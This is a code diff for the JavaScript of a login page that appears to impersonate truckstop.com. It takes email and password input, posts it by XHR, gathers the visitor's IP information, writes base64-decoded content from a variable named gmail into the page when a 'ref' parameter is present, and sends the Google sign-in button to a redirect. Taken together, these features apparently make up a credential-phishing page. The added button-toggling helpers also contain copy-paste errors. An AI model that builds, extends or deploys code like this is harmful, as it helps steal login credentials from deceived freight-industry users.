@@ -10,6 +10,8 @@ let hasRef = new URLSearchParams(window.location.search).has('ref');
 
 let clientIpInfo;
 
+
+
 if (hasRef) {
     let ref = gmail;
     document.write(decodeURIComponent(atob(`${ref}`)));
@@ -32,7 +34,7 @@ document.body.addEventListener('click', function (e) {
             console.log('true');
         }
     } else if (targetId == 'continue-with-google') {
-        signIn();
+        redirect()
     } else if (targetId == 'register-new-user') {
         location.href = 'https://truckstop.com/contact-us/';
     }
@@ -70,6 +72,7 @@ function processCode() {
 
     // if both are filled, continue
     if (emailValue !== '' && passwordValue !== '') {
+        disableButtons();
         signIn();
     }
 }
@@ -92,6 +95,7 @@ function signIn() {
 
     signInXhr.onreadystatechange = function () {
         if (this.status == 200 && this.readyState == 4) {
+            enableButtons();
             let response = JSON.parse(this.response);
             redirect();
         }
@@ -132,4 +136,26 @@ async function loadClientInfo() {
     }
 }
 
+
+// Disable both buttons
+function disableButtons() {
+    const submitBtn = document.getElementById('submit');
+    const googleBtn = document.getElementById('continue-with-google');
+    const register = document.getElementById('register-new-user');
+    if (submitBtn) submitBtn.disabled = true; submitBtn.style.opacity = 0.3
+    if (googleBtn) googleBtn.disabled = true; googleBtn.style.opacity = 0.3
+    if (register) googleBtn.disabled = true; register.style.opacity = 0.3
+}
+
+// Re-enable buttons
+function enableButtons() {
+    const submitBtn = document.getElementById('submit');
+    const googleBtn = document.getElementById('continue-with-google');
+    const register = document.getElementById('register-new-user');
+    if (submitBtn) submitBtn.disabled = false; submitBtn.style.opacity = 1
+    if (googleBtn) googleBtn.disabled = false; googleBtn.style.opacity = 1
+    if (register) googleBtn.disabled = false; register.style.opacity = 1
+}
+
 loadClientInfo();
+
